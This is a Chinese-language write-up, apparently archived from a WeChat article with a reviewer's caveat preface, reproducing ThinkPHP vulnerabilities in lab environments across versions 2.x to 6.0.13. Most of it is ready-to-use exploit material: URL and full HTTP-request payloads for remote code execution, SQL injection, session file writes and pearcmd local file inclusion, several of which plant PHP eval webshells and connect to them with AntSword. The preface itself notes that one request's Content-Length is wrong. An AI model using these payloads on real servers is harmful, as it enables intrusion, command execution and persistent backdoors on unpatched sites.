---
version: ""
source: "MrWQ/vulnerability-paper"
product: "ThinkPHP / 多根因"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
version_notes: "docker compose up -d"
title: "漏洞复现   ThinkPHP 全版本漏洞复现"
prerequisites: "来源所述条件，未列明部分仍待核：2.x、5.0.9 SQL、5.x两RCE、6.0.1 session、<=6.0.13多语言；标题全版本夸大"
side_effects: "未执行；本文需注意的操作影响：副作用与来源需补；多处写shell和改系统composer全局源，缺恢复；原生请求与截图可作变体附件"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/A23P3EWTSTLkL5N0xXoIWg"
id: "vw-2712bc7cbd3ff00b5e6562e5"
entity_id: "ve-2712bc7cbd3ff00b5e6562e5"
schema_version: "1"
---

## 核对与使用边界

- 明确更正：原 version 字段抽入命令、源码、路径、配置或普通叙述，不是版本号，已清空机器版本字段并原样保留于 version_notes；实际版本/分支条件见本节逐篇记录，未从代码猜造版本。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：2.x、5.0.9 SQL、5.x两RCE、6.0.1 session、&lt;=6.0.13多语言；标题全版本夸大

代码与实验材料：537行全读，包含完整GET/头/Cookie实验，session第一方案明确失败，保留失败说明

来源证据范围：微信原文，提Vulhub但无精确出处

- **实验改动边界（1）**：人为绕过依赖兼容检查不宜作为安装建议；依据：作者修改70400版本检查以PHP7.3强行运行，可能掩盖实际依赖不兼容，需固定可兼容环境。以下步骤按原实验条件保留；人工改动后的行为只支持该修改环境，不用于证明未修改发行版默认可利用。

- **事实待核（2）**：version元数据为命令；依据：字段docker compose up -d而非版本。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **适用与权限边界（3）**：实验范围与标题不符；依据：只选若干版本，不能“全版本”；5.0.9 SQL与511&lt;5.0.9边界需核验。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **结论使用边界（4）**：请求长度明显未随body更新；依据：写shell包Content-Length73但body远长于id示例；不应原样复制。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **操作与副作用边界（5）**：副作用与来源需补；依据：多处写shell和改系统composer全局源，缺恢复；原生请求与截图可作变体附件。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 漏洞复现   ThinkPHP 全版本漏洞复现

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/A23P3EWTSTLkL5N0xXoIWg)

ThinkPHP
========

TP - 2.x-RCE
------------

ThinkPHP 2.x 版本中，使用`preg_replace`的`/e`模式匹配路由：

```
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));

```

导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。

ThinkPHP 3.0 版本因为 Lite 模式下没有修复该漏洞，也存在这个漏洞。

环境搭建

执行如下命令启动 ThinkPHP 2.1 的 Demo 应用：

```
docker compose up -d

```

![](../../.resource/remote/af24e775384d7424b2dddfd2a1e2085f059c56c00c38b031896e35ebcbe3824e.png)

环境启动后，访问`http://your-ip:8080/Index/Index`即可查看到默认页面。

漏洞复现

直接访问`http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D`即可执行`phpinfo()`：

![](../../.resource/remote/6538d74e23c490981ca5a6a350ba1899b50876d3607fd06e3217a52344278153.png)

TP - 2.x-RCE x Getshell
-----------------------

下面给出一个能够直接菜刀连接的 payload：

```
/index.php?s=a/b/c/${@print(eval($_POST[1]))}

```

![](../../.resource/remote/7639cdfe4843d4eaf35151a730ffb9dd34852b356728fde72a301844e8a658ff.png)

使用蚁剑连接

![](../../.resource/remote/327e05c107ba092766fdbd687eb5243286f80facb1145126f2a8a2d5da171e10.png)

![](../../.resource/remote/152ce62530c620419d24dc8ef97e2e383d64a744a62cf3b1372fcdb07a7df895.png)

TP - 5.0.9-SQLi
---------------

启动后，访问`http://your-ip/index.php?ids[]=1&ids[]=2`，即可看到用户名被显示了出来，说明环境运行成功。

![](../../.resource/remote/d3ef1630a36e76f4910e41892102f7704ea8be3c818752d08890dea82dceff55.png)

访问`http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1`，信息成功被爆出：

![](../../.resource/remote/732a53670f4fe8a237cdb08c7875fad752ecf4a1f9e0a5e62320547bd22eaa9d.png)

找到数据库账号密码，敏感信息泄露。

![](../../.resource/remote/afdc368192acfc7433ef3b878d0673ca63e1d2bbc82960bc4bbf7401e7fbc4bc.png)

![](../../.resource/remote/bcb9a4481c7493a28f2edb35fcfe62f6314b368d6412060b1e0150f34000a748.png)

TP - 5.0.22/5.1.29-RCE
----------------------

ThinkPHP 是一款运用极广的 PHP 开发框架。其版本 5 中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。

控制器名未过滤导致 rce

`function`为反射调用的函数，`vars[0]`为传入的回调函数，`vars[1][]`为参数为回调函数的参数

运行 ThinkPHP 5.0.20 版本：

```
docker compose up -d

```

环境启动后，访问`http://your-ip:8080`即可看到 ThinkPHP 默认启动页面。

![](../../.resource/remote/2e66d03cf9ce0afc3b9fcf869b5fadeb79c9692e67239740ea21d2e670882a0b.png)

直接访问`http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1`，即可执行 phpinfo

![](../../.resource/remote/4b49a64b3062fc1acf7bfae468e30ea13fcad8ce2849e2f9b03cda75ae2eec39.png)

```
http://192.168.66.132:8080/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

```

![](../../.resource/remote/7fc3d9d85f08b593614223c8784f01a274df7d4ce0ecea3ff944f8791828b169.png)

TP - 5.0.22/5.1.29-RCE x Getshell
---------------------------------

```
http://192.168.66.132:8080/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo '<?php @eval($_POST[1]);?>' > shell.php

```

![](../../.resource/remote/de8bc99c2152bf7094d27254976ea9bd474fbc6365b181eacb308e7732828db3.png)

TP - 5.0.23-RCE
---------------

ThinkPHP 是一款运用极广的 PHP 开发框架。其 5.0.23 以前的版本中，获取 method 的方法中没有正确处理方法名，导致攻击者可以调用 Request 类任意方法并构造利用链，从而导致远程代码执行漏洞。

在 vulhub 中开启即可

![](../../.resource/remote/7b2d08e9ba7a6a216e771950586390713eebd4dc6ed4530cfdc7848b5e4b672b.png)

页面访问

![](../../.resource/remote/b95fe37c6baf6b5bca41ee1c1284e45c8c66a05fefc140dba04f27ac74b7ba9f.png)

抓包更改为 POST

![](../../.resource/remote/fc76866b57583ae9acfdf106370614c34a2a8854b63d80c1db0f7c70ec4ba679.png)

```
POST /index.php?s=captcha HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

```

![](../../.resource/remote/14aa4bbf4e83e85536df740fdc1c0e762cda970ed30566c001e3fd77431ad00d.png)

TP - 5.0.23-RCE x Getshell
--------------------------

```
POST /index.php?s=captcha HTTP/1.1
Host: 192.168.66.132:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: think_lang=zh-cn
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 73

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo '<?php @eval($_POST[1]);?>' > shell.php

```

![](../../.resource/remote/9a0381547da88616fad2f780397a2e430b5754483191cfa8e86567f4d430c093.png)

响应 500，实际上上传成功

![](../../.resource/remote/af27882b688bcdbbd715e9890098b06b0df06f4c27cf31c5d3a59ba860ca0051.png)

访问浏览器

![](../../.resource/remote/32d182a1fa20c03848b67c7861a6df99ca063cac1fd965f64aa0f926b3f3bbb8.png)

蚁剑连接

![](../../.resource/remote/7ab185c9ab57aa526f785d2f9ed2e4507157838bbb76e3d89d46d2897ca20754.png)

TP - 6.0.1 Session 任意文件操作
-------------------------

使用 Kali 来一步一步部署 6.0 的 tp

```
# 安装compose并放到bin下
curl -sS https://getcomposer.org/installer | php
mv composer.phar /usr/local/bin/composer
# 换源
composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
# 安装thinkphp6.0
cd /var/www/html
composer create-project topthink/think tp6 6.0.1 --prefer-dist

# 依赖
sudo apt-get install php-mbstring
sudo apt-get install php-dom

# 启动
cd tp6
php think run -p 8000
# ！访问 ip:8000

```

![](../../.resource/remote/691e3216b7c20ada250e43d1fa7344ae5e9cfeb2fc7fec8bca087b80820e1014.png)

![](../../.resource/remote/b91ba451004c559933be3be6875797baf529f474dddbb1635c56f2f7d4f41d08.png)

更改版本，使用 composer update 即可更新版本, “^6.0.0” 改为 "6.0.1"

修改两个文件，首先修改 app/controller/Index.php

```
<?php
namespace app\controller;

use app\BaseController;

class Index extends BaseController
{
   public function index()
  {
       # + 加上这三行
       $a = isset($_GET['a']) && !empty($_GET['a']) ? $_GET['a'] : '';
       $b = isset($_GET['b']) && !empty($_GET['b']) ? $_GET['b'] : '';
       session($a,$b);
       return '<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px;} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:) </h1><p> ThinkPHP V6<br/><span style="font-size:30px">13载初心不改 - 你值得信赖的PHP框架</span></p></div><script type="text/javascript" src="https://tajs.qq.com/stats?sId=64890268" charset="UTF-8"></script><script type="text/javascript" src="https://e.topthink.com/Public/static/client.js"></script><think id="eab4b9f840753f8e7"></think>';
  }

   public function hello($name = 'ThinkPHP6')
  {
       return 'hello,' . $name;
  }
}

```

开启 session 且写入的 session 可控

/tp6/app/middleware.php 文件开启 session

去掉注释 session 的 //

![](../../.resource/remote/43ada9df3606bf7b131f70f18737b61be6fc773f128e4c9324ab1d5c3582f626.png)

> 遇到的一些小问题，kali 下载 php7.4 一直缺少依赖，72,73 都安装成功，但是 composer 必须 7.4 及以上，这就很烦，我干脆干掉它，直接找文件改代码，等于 7.3。没想到成功。

![](../../.resource/remote/fadedef53df6847ade8c4c3e2c47deb35ecdc90ec0b8b4278c87090fa6b0888f.png)

本来是 70400，再次执行 php7.3 think run 就 ok 了

![](../../.resource/remote/06ed77a2209af1901f7be70d89d9dee0e16de445f9e643a819f8d82062eaa8a2.png)

方法一

```
GET /?a=a&b=12<?php+phpinfo();+?> HTTP/1.1
Host: 192.168.66.132:8001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=1234567890123456789012345678.php;
Upgrade-Insecure-Requests: 1



```

![](../../.resource/remote/802788a0fb47c40e8875b8fb5de1c1ced1a5fb618344074f751b3e5a1e5bd9fa.png)

1234567890123456789012345678.php

```
http://192.168.66.132:8001/runtime/session/sess_1234567890123456789012345678.php

```

![](../../.resource/remote/317dc37d6403a1239f81ee369c7220806c70f58537bd0fd393b4b03550f7da6a.png)

访问没成功，emmm

方法二

```
GET /?a=a&b=12<?php+phpinfo();+?> HTTP/1.1
Host: 192.168.66.132:8001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=/../../../public/aaaaaaaaaaa.php;
Upgrade-Insecure-Requests: 1



```

![](../../.resource/remote/065fff223f0720e191e50984f2c0d21fa69ee410a497bf8db870f45caf68ece2.png)

![](../../.resource/remote/7c8acbef2f213af6b82a5b5c9d8067d678df68577beef19712547f445349012a.png)

TP - 6.0.13-Pearcmd x EXP
-------------------------

ThinkPHP 是一个在中国使用较多的 PHP 框架。在其 6.0.13 版本及以前，存在一处本地文件包含漏洞。当多语言特性被开启时，攻击者可以使用`lang`参数来包含任意 PHP 文件。

虽然只能包含本地 PHP 文件，但在开启了`register_argc_argv`且安装了 pcel/pear 的环境下，可以包含`/usr/local/lib/php/pearcmd.php`并写入任意文件。

Payload:

```
GET /public/index.php?+config-create+/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
Host: 192.168.36.128
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
think-lang:../../../../../../../../usr/local/lib/php/pearcmd
Cookie: think_lang=zh-cn
Connection: close

```

![](../../.resource/remote/ecec30fe510bea516e9c818fa37f1236fc64143b87c5d3b89dab10af8e92db38.png)

查看

```
docker exec -it 20c58ef53381 /bin/bash

```

![](../../.resource/remote/0fe535db507f6f361e357bcb9d83f6f8651c53a74266ff829a144c0ca62e0a43.png)

包含 hello.php

```
GET /public/index.php HTTP/1.1
Host: 192.168.36.128
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
think-lang:../../../../../../../../tmp/hello
Cookie: think_lang=zh-cn
Connection: close

```

浏览器访问

![](../../.resource/remote/18b918ac17f4e92fb2d6929295bb890b1e174d368959a0ce4a7251a3be90d257.png)

TP - 6.0.13-Pearcmd x GET
-------------------------

需要根据实际情况改变文件名称，写不进去可以考虑多加点../

```
GET /public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/1.php HTTP/1.1
Host: 192.168.36.128
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: think_lang=zh-cn
Connection: close

```

![](../../.resource/remote/1d62b87902912a45d9c61b8fa75c4f054fd97a08e2d8638752c3f2e091fb187d.png)

查看是否成功

![](../../.resource/remote/2df283a5c87edd58b6f0c165139d598030569d74510741bfa9fb4065a33d3638.png)

文件包含读取

```
GET /public/index.php?lang=../../../../../../../../../../../../tmp/1 HTTP/1.1
Host: 192.168.36.128
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: think_lang=zh-cn
Connection: close

```

![](../../.resource/remote/89bcf8ac244717895a5c14f7fa994393e2a92cfee3336e3fa6150964f125253b.png)

![](../../.resource/remote/713b739df7da594f4861da490f7787794d69ed962fc84b137bccdb94a8c8273f.png)

TP - 6.0.13-Pearcmd x HEADER
----------------------------

```
GET /public/index.php?+config-create+/&/<?=phpinfo()?>+/tmp/2.php HTTP/1.1
Host: 192.168.36.128
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
think-lang:../../../../../../../../../../../../../../usr/local/lib/php/pearcmd
Cookie: think_lang=zh-cn
Connection: close

```

![](../../.resource/remote/898ae40532712c6e9ffdd706b67840dc9a4da39ca3506d5047a892803ed48e8f.png)

查看

![](../../.resource/remote/d40bfb98d27f85d417b8efa7dd6d15282f7e8b8c4632234eec33c9e1ec5eb6bd.png)

文件包含查看

```
GET /public/index.php?lang=../../../../../../../../../../../../tmp/2 HTTP/1.1
Host: 192.168.36.128
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: think_lang=zh-cn
Connection: close

```

![](../../.resource/remote/1edbb981b791933a9ddd8067532492ed324a2d3b6f78d79ecc888d0ec89f30a0.png)

TP - 6.0.13-Pearcmd x COOKIES
-----------------------------

```
GET /public/index.php?+config-create+/&/<?=phpinfo()?>+/tmp/3.php HTTP/1.1
Host: 192.168.36.128
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: think_lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd
Connection: close

```

![](../../.resource/remote/c6324e7286e057b132fb156c48da77bfabaa0f6ec04439b9c19d51a83cd827cf.png)

查看是否成功

![](../../.resource/remote/853fbb90833680b9a796e33599d95ead3ad456d4252bd8b592d039c85b7efc22.png)

文件包含查看

```
GET /public/index.php?lang=../../../../../../../../../../../../tmp/3 HTTP/1.1
Host: 192.168.36.128
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Sec-Purpose: prefetch;prerender
Purpose: prefetch
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: think_lang=zh-cn
Connection: close

```

![](../../.resource/remote/45c79e6108fdcb1c03b12ef103cab6050aa789fad59ebff3a95524739d40e2e6.png)

TP - 6.0.13-Pearcmd x Getshell
------------------------------

```
GET /public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=@eval($_POST['cmd']);?>+/var/www/html/shell.php HTTP/1.1
Host: 192.168.36.128
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: think_lang=zh-cn
Connection: close

```

![](../../.resource/remote/d351b77610501246d27b2df42842a463ddc2222dd648f7f8eb90f2ba297cb715.png)

文件包含访问

```
GET /public/index.php?lang=../../../../../../../../../../../../var/www/html/shell HTTP/1.1
Host: 192.168.36.128
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Sec-Purpose: prefetch;prerender
Purpose: prefetch
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cookie: think_lang=zh-cn
Connection: close

```

页面访问

![](../../.resource/remote/03a3c72c31579faa27e4e49b43fee1541dce3d6ce3dc7300de5748623ea9a8c0.png)

使用蚁剑连接

![](../../.resource/remote/77d8cc8ad61b883e6693eb47331de1f8da6b26bad113f03bea92f09a2d008ab8.png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
